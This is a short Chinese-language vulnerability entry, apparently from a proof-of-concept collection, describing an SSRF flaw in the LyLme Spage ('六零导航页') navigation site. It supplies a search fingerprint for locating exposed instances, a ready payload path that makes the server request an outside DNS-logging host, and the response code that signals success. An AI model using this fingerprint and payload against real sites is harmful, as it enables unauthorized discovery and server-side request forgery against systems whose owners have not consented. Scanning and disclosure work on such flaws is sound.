# 六零导航页存在SSRF漏洞

六零导航页 ｜ SSRF ｜ —
- **指纹**：`title=="上网导航 - LyLme Spage"`

**Payload**
```
/apply/index.php?url=http://www.dnslog.cn
```
- **响应特征**：200